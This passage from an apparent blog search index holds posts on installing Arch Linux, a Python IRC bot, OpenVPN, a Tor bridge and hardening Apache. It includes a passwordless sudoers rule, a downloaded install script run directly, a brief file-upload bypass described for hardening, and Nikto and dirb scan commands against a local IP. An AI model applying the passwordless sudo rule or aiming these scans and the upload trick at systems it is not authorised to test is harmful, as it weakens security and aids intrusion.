&#x2F;mnt&#x2F;home mount &#x2F;dev&#x2F;nvme0n1p3 &#x2F;mnt&#x2F;home Install the systempacstrap -i &#x2F;mnt base linux linux-firmware sudo nano Generate fstab filegenfstab -U -p &#x2F;mnt &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;fstab Chroot to the installed systemarch-chroot &#x2F;mnt &#x2F;bin&#x2F;bash Set root passwordTo set a root password passwd Create a new useruseradd peanutstick -m set the password passwd peanutstick Set localeuncomment the right line, for me it’s fr_FR.UTF-8 UTF-8, because I am French! nano &#x2F;etc&#x2F;locale.gen now generate it. locale-gen Create a locale.conf file. echo &quot;LANG&#x3D;fr_FR.UTF-8 UTF-8&quot; &gt; &#x2F;etc&#x2F;locale.conf Set the time zoneln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F; Now select your time zone ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Europe&#x2F;Paris &#x2F;etc&#x2F;localtime Set local timehwclock --systohc --utc To check it: date Set hostnameecho peanutstick &gt; &#x2F;etc&#x2F;hostname Also add the name in /etc/hosts nano &#x2F;etc&#x2F;hosts it should look like this: 127.0.0.1 localhost ::1 localhost 127.0.1.1 peanutstick Enable networkInstall the network manager: pacman -S networkmanager Enable it: systemctl enable NetworkManager If you don’t do this part, your computer will not be able to connect to the network and you will not be able to download the packet. Install GRUBInstall Grub and efibootmgr pacman -S grub efibootmgr install the bootlader: mkdir &#x2F;boot&#x2F;efi mount &#x2F;dev&#x2F;nvme0n1p1 &#x2F;boot&#x2F;efi grub-install --target&#x3D;x86_64-efi --bootloader-id&#x3D;GRUB --efi-directory&#x3D;&#x2F;boot&#x2F;efi --removable grub-mkconfig -o &#x2F;boot&#x2F;grub&#x2F;grub.cfg Rebootexit umount -R &#x2F;mnt reboot Change boot orderdon’t pull out the USD stick, and select the last option to change the settings. Set the right boot order, to boot on your hdd or ssd. Disable speakerMy computer do a big BIP when I press tab or do something wrong: rmmod pcspkr To make it persistent: nano &#x2F;etc&#x2F;modprobe.d&#x2F;nobeep.conf And write: blacklist pcspkr Permanent KEYMAPnano &#x2F;etc&#x2F;vconsole.conf I will write: KEYMAP&#x3D;fr Add User to SudoersAs root: nano &#x2F;etc&#x2F;sudoers add this to the end: peanutstick ALL&#x3D;(ALL) NOPASSWD:ALL Be careful, the user can be root by just typing sudo su, sudo /bin/bash and more Install sshdpacman -S openssh Swap FileYou probably have noticed that I have not created a Swap partition. It’s because this guy in this tutorial recommend to use swap file: https://averagelinuxuser.com/linux-swap/ Create a Swap file of 3G or whatever your RAM size is: fallocate -l 3G &#x2F;swapfile Change its access rules, format and enable it: chmod 600 &#x2F;swapfile mkswap &#x2F;swapfile swapon &#x2F;swapfile Also, add this Swap file to the /etc/fstab: echo &#39;&#x2F;swapfile none swap sw 0 0&#39; &gt;&gt; &#x2F;etc&#x2F;fstab And check if the Swap file is working: free -m Install X window system and audiopacman -S pulseaudio pulseaudio-alsa xorg xorg-xinit xorg-server Enter to select all. Install desktop environmentInstall xorg: sudo pacman -S xorg xorg-server This is for mate. sudo pacman -S mate mate-extra lightdm lightdm-gtk-greeter But I preffer Xfce: sudo pacman -S --needed xfce4 mousepad parole ristretto thunar-archive-plugin thunar-media-tags-plugin xfce4-battery-plugin xfce4-datetime-plugin xfce4-mount-plugin xfce4-netload-plugin xfce4-notifyd xfce4-pulseaudio-plugin xfce4-screensaver xfce4-taskmanager xfce4-wavelan-plugin xfce4-weather-plugin xfce4-whiskermenu-plugin xfce4-xkb-plugin file-roller network-manager-applet leafpad epdfview galculator lightdm lightdm-gtk-greeter lightdm-gtk-greeter-settings capitaine-cursors arc-gtk-theme xdg-user-dirs-gtk Enable the lightDM service to start on boot. sudo systemctl enable lightdm Finally, reboot your ArchLinux system. sudo reboot","categories":[{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Create an IRC bot with python","slug":"Create-an-IRC-bot-with-python","date":"2021-06-21T19:25:10.000Z","updated":"2022-09-27T07:49:09.738Z","comments":true,"path":"/post/Create-an-IRC-bot-with-python.html","link":"","permalink":"https://peanutstick.github.io/post/Create-an-IRC-bot-with-python.html","excerpt":"","text":"Create an IRC bot with Python3Installation of python3.apt update apt upgrade apt install python3 Create the project and start to code.You have to create a file like “main.py” in a directory where will be your bot. Import some necessary libraries.In main.py. import socket, ssl, threading import score_board as score Add the configuration variables.Don’t forget to comment the code, it’s important. server = 'irc.evilcorp.ga' # Server port = 6697 # Port channel = \"#lobby\" # Channel botnick = \"Dovahkiin\" # Your bots nick password = \"\" user = botnick + \" \" + botnick + \" \" + botnick + \" \" + \"HODL the line apes!\" # This is username, hostname, identity and description in the order Connect to the serversocketHandler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# Opening up a normal socket. socketHandler.connect((server,port))# Binding socket to socket address(server ip and port). ircsock = ssl.wrap_socket(socketHandler)# Wraping the socket with ssl. ircbuff = ircsock.recv(2048).decode('utf-8') # Receive buffer from the server. ircbuff = ircbuff.strip('\\r\\n') # Removing any unnecessary linebreaks. print(ircbuff) # Printing buffer for once. del ircbuff # Deleting buffer for re-use. ircsend(\"NICK \"+ botnick +\"\\r\\n\") # Here we actually assign the nick to the bot print(\"Sending Nick \" + botnick + \" to server\") ircsend(\"USER \"+ user + \"\\r\\n\") # User authentication print(\"Sending UserName and hostname and identity and description \\\"\" + user + \"\\\" to server\") Create the loop to receive the bufferwhile 1: # Be careful with these! it might send you to an infinite loop ircbuff = ircsock.recv(2048).decode('utf-8') # Receive buffer from the server. ircbuff = ircbuff.strip('\\r\\n') # Removing any unnecessary linebreaks. print(ircbuff) # Here we print the buffer from the server. if ircbuff.find(\"PING :\") != -1: # If the server pings us then we've got to respond! ping(ircbuff) elif ircbuff.find(\"NOTICE \" + botnick + \" ::This nickname is registered\") != -1: ircsend(\"/msg NickServ IDENTIFY \"+password) elif ircbuff.find(\"NOTICE \" + botnick + \" :*** You are connected to\") != -1: # If connected successfully, do the below functions and codes. joinchan(channel) # Join the channel using the functions we previously defined And your code will be just after that with an another elif, like this: elif ircbuff.find(\"coffee\") != -1: # Bring you a coffee coffee() And we delete the buffer because the script will process the previous messages and send too much messages to the server. del ircbuff now we have to create the function: ping for ping(ircbuff) ircsend for ircsend(“/msg NickServ IDENTIFY “+password) joinchan for joinchan(channel) coffee for coffee() Create the functionsdef ircsend(msg): # I had to make another function for send() because in python3 and above the socket incoming and outgoing messages are in bytes format. So you have to encode and decode it accordingly. ircsock.send(msg.encode('utf-8')) def ping(ircbuff): # This is our first function! It will respond to server Pings. pongReply = ircbuff.split(':',1)[-1] # This strips out ping reply and server name for pong. If not defined it can cause the bot to break in some servers ircsend(\"PONG :\" + pongReply + '\\r\\n') def joinchan(chan): # This function is used to join channels. ircsend(\"JOIN \"+ chan +\"\\r\\n\") def coffee(): # This function responds to a user that inputs \"Hello Mybot\" ircsend(\"PRIVMSG \"+ channel +\" : ,--.\\r\\n\") ircsend(\"PRIVMSG \"+ channel +\" : C|:p| Here is your coffee !\\r\\n\") ircsend(\"PRIVMSG \"+ channel +\" : `=='\\r\\n\") ThanksThank to Shadow Lobster for the help.","categories":[{"name":"Programing","slug":"Programing","permalink":"https://peanutstick.github.io/categories/Programing/"}],"tags":[{"name":"IRC Python","slug":"IRC-Python","permalink":"https://peanutstick.github.io/tags/IRC-Python/"}]},{"title":"OpenVPN","slug":"openVPN","date":"2021-06-20T15:53:11.000Z","updated":"2022-09-27T07:49:11.001Z","comments":true,"path":"/post/openVPN.html","link":"","permalink":"https://peanutstick.github.io/post/openVPN.html","excerpt":"","text":"How to create a VPN with OpenVPNDownload the script wget https://raw.githubusercontent.com/angristan/openvpn-install/master/openvpn-install.sh And them run it: chmod +x openvpn-install.sh./openvpn-install.sh That’s all, I hope you liked it.","categories":[{"name":"Service","slug":"Service","permalink":"https://peanutstick.github.io/categories/Service/"}],"tags":[{"name":"VPN","slug":"VPN","permalink":"https://peanutstick.github.io/tags/VPN/"}]},{"title":"Création d'un relais tor avec debian 10","slug":"Relais-tor","date":"2021-04-09T11:45:52.000Z","updated":"2022-09-27T07:49:09.581Z","comments":true,"path":"/post/Relais-tor.html","link":"","permalink":"https://peanutstick.github.io/post/Relais-tor.html","excerpt":"","text":"Ajout du dépôtOn ajoute le dépôt de tor a nos source list, je prend jessie mais cela dépend de votre debian:https://2019.www.torproject.org/docs/debian.htmlDans le fichier /etc/apt/source.list ajoutez ces lignes: deb https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org jessie main deb-src https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org jessie main Ajout de la clée GPG pour signer les packetsVous aurez besoins de curl. sudo apt install curl Ensuite ajoutez la clés. curl https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org&#x2F;A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add - Installation de torapt update apt install tor deb.torproject.org-keyring Configuration du relaisOn vas copier le fichier de conf puis l’éditer. sudo mv &#x2F;etc&#x2F;tor&#x2F;torrc &#x2F;etc&#x2F;tor&#x2F;torrc.default sudo nano &#x2F;etc&#x2F;tor&#x2F;torrc J’y ai mis le minimum, je vous conseille de lire la doc si vous avez besoins de plus de paramètres. ##default bridge port 443 ORPort 1339 ##uncomment if you don&#39;t want torproject.org to know your bridge PublishServerDescriptor 0 Nickname [à changer] ContactInfo [à changer] ##leave rest unchanged log notice file &#x2F;var&#x2F;log&#x2F;tor&#x2F;tor.log SocksPort 0 BridgeRelay 1 Exitpolicy reject *:* ORPort 1339C’est mon numéro de port, de base c’est 443. PublishServerDescriptor 0Pour ne pas montrer son bridge, je préfère ne pas le montrer car il ne sert qu’a une personne. log notice file /var/log/tor/tor.logChemin du fichier de log. Ensuite on verifie que la config est bonne. sudo -u debian-tor tor --verify-config teste du relaisOn redémare tor. sudo service tor restart Puis on regarde les logs. tail -f &#x2F;var&#x2F;log&#x2F;syslog | grep tor -i Si vous ne voyez pas de warning c’est que cela fonctionne, vous devriez voir des [notice] seulement. Ajout du relais Ouvrez votre navigateur tor browser. Allez dans option puis tor. Cochez la case utiliser un pont puis fournir un pont Vous y entrer l’adresse IP du serveur ainsi que le port.Pour ma part c’est 93.95.226.163:1339.Puis redemarer le navigateur.","categories":[{"name":"Service","slug":"Service","permalink":"https://peanutstick.github.io/categories/Service/"}],"tags":[{"name":"Tor","slug":"Tor","permalink":"https://peanutstick.github.io/tags/Tor/"}]},{"title":"Securing an apache server","slug":"Secu-apache","date":"2021-03-09T11:45:52.000Z","updated":"2022-09-27T07:49:10.891Z","comments":true,"path":"/post/Secu-apache.html","link":"","permalink":"https://peanutstick.github.io/post/Secu-apache.html","excerpt":"","text":"Disable indexing/etc/apache2/apache2.conf It must be activated on all &lt;Directory /path&gt; except at the root &lt;Directory /var/www/&gt;Options Indexes FollowSymLinksAllowOverride NoneRequire all granted&lt;/Directory&gt; To deactivate the directory listing, edit the second line: &lt;Directory /var/www/&gt;Options FollowSymLinksAllowOverride NoneRequire all granted&lt;/Directory&gt; Restrict access to the configuration filesIt’s possible to download the files even if the indexing is disabled To block txt files &lt;Files ~ &quot;\\.txt$&quot;&gt;Order allow,denyDeny from all&lt;/Files&gt; Hide version of ApacheWe can see the apache version easily in the network tab while you use the inspector /etc/apache2/apache2.confAdd these lines at the bottom : ServerTokens ProdServerSignature Off Disable ETagsETag is a server response header that allows browsers to make conditional requests and perform cache validation efficiently. On the other hand, it poses security risks in case it gets leaked by your code, and can result in cache poisoning attack on your website. So it is better to disable ETag if your website does not need it.https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag /etc/apache2/apache2.confAdd this line at the bottom : FileETag None Removal of guest rights cd /etc/apache2chmod 750 * -R 7 = All rights for the root user 5 = Read and execute for the group 0 = Nothing for guest Securing against http Verb TamperingHTTP Verb Tampering is an attack that exploits vulnerabilities in HTTP verbauthentication and access control mechanisms. Upload the file image.php.png The file valide because of png Pausing the request Rename the file in image.php The file image.php is on the server /etc/apache2/apache2.conf Add Deny from all like this but don’t us it in the root: &lt;LimitExcept POST GET&gt;Deny from all&lt;/LimitExcept&gt; https://stackoverflow.com/questions/40914743/apache-limitexcept-only-to-get-and-post-methods Xss protectionEnable this module a2enmod headers /etc/apache2/apache2.conf Add the like like this: &lt;Directory /&gt;Header set X-XSS-Protection &quot;1; mode=block&quot;&lt;/Directory&gt; Restriction du fichier .htaccessOn empêche la lecture du fichier htaccess par un utilisateur \\&lt;Directory &#x2F;\\&gt; AllowOverride None \\&lt;&#x2F;Directory\\&gt; Protection contre le vol de cookieNe Pas le faire pour iTop, il demande une connexion a chaque page caril garde la connexion grâce au cookie et pas avec une variable desession !!! Puis dans le fichier /etc/apache2/apache2.conf on ajoute. \\&lt;Directory &#x2F;\\&gt; Header edit Set-Cookie \\^(.\\*)\\$ \\$1;HttpOnly;Secure \\&lt;&#x2F;Directory\\&gt; Protection contre le clickJackingDans le fichier /etc/apache2/apache2.conf on ajoute \\&lt;Directory &#x2F;\\&gt; Header always append X-Frame-Options SAMEORIGIN \\&lt;&#x2F;Directory\\&gt; Limiter les DOSDans le fichier /etc/apache2/apache2.conf On passe le timeout de 300 à 10. MaxClients 150 KeepAlive On MaxKeepAliveRequests 100 KeepAliveTimeout 10 Il ne sera pas totalement protégé mais il sera moins vulnérable. Cacher le manuel apache2Le manuel permet d’avoir la version d’apache2 nano /etc/apache2/conf-available/apache2-doc.conf Commentez la première ligne Protection contre le reniflage MIME[https://www.keycdn.com/support/what-is-mime-sniffing]](https://www.keycdn.com/support/what-is-mime-sniffing) nano /etc/apache2/conf-available/security.conf Ajoutez ces lignes \\&lt;IfModule mod\\_headers.c\\&gt; Header always set X-Content-Type-Options \\&quot;nosniff\\&quot; \\&lt;&#x2F;IfModule\\&gt; Restreindre l’accès à /icons/READMEnano /etc/apache2/apache2.conf \\&lt;Directory \\&quot;&#x2F;usr&#x2F;share&#x2F;apache2&#x2F;icons\\&quot;\\&gt; Options FollowSymlinks AllowOverride None Order allow,deny Deny from all \\&lt;&#x2F;Directory\\&gt; Mise en place de ModsecurityInstallationModsecurity est un pare-feu applicatif, dont le rôle est de filtrer lesrequêtes entrant sur un serveur HTTP Apache. Il se présente sous laforme d&#39;un module apache, qui analyse les requêtes reçues grâce àl&#39;emploi d&#39;une base des règles de requêtes considérées comme nonsouhaitées. https://www.inmotionhosting.com/support/server/apache/install-modsecurity-apache-module/ sudo apt update -y sudo apt install libapache2-mod-security2 sudo systemctl restart apache2 Vérification que le paquet a une version supérieure à 2.9 apt-cache show libapache2-mod-security2 | grep -E&#39;(Version|Package)&#39; sudo cp /etc/modsecurity/modsecurity.conf-recommended/etc/modsecurity/modsecurity.conf sudo nano /etc/modsecurity/modsecurity.conf Changer SecRuleEngine DetectionOnly pour SecRuleEngine On ConfigurationOn télécharge la config d’OWASP, un organisme reconnu dans le monde dela sécu. Cd /tmp wget https://github.com/coreruleset/coreruleset/archive/v3.3.0.zip unzip FileName.zip mv coreruleset-3.3.0/crs-setup.conf.example/etc/modsecurity/crs-setup.conf mv coreruleset-3.3.0/rules/ /etc/modsecurity/ nano /etc/apache2/mods-enabled/security2.conf Ajoutez ça et commentez commentez la dernière ligne. IncludeOptional &#x2F;etc&#x2F;modsecurity&#x2F;\\*.conf Include &#x2F;etc&#x2F;modsecurity&#x2F;rules&#x2F;\\*.conf systemctl restart apache2 LogsOn peut observer en direct les logs avec tail -f /var/log/apache2/error.log (liste les attaques et warning) tail -f /var/log/apache2/modsec_audit.log (liste tout) tail -f /var/log/apache2/access.log (logs clairs avec IP re ressourcechargée) Fail2banScansNiktoNikto -host 192.168.101.147 -o scan_iTop.html DirbDirb http://192.168.101.147 Pour l’aide : dirb Il est possible de changer de word list : dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt","categories":[{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"}],"tags":[]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"},{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"},{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"},{"name":"Os","slug":"Os","permalink":"https://peanutstick.github.io/categories/Os/"},{"name":"Service","slug":"Service","permalink":"https://peanutstick.github.io/categories/Service/"},{"name":"Programing","slug":"Programing","permalink":"https://peanutstick.github.io/categories/Programing/"},{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"},{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/tags/Security/"},{"name":"Linux, Gaming","slug":"Linux-Gaming","permalink":"https://peanutstick.github.io/tags/Linux-Gaming/"},{"name":"Pentest","slug":"Pentest","permalink":"https://peanutstick.github.io/tags/Pentest/"},{"name":"IRC Python","slug":"IRC-Python","permalink":"https://peanutstick.github.io/tags/IRC-Python/"},{"name":"VPN","slug":"VPN","permalink":"https://peanutstick.github.io/tags/VPN/"},{"name":"Tor","slug":"Tor","permalink":"https://peanutstick.github.io/tags/Tor/"}]}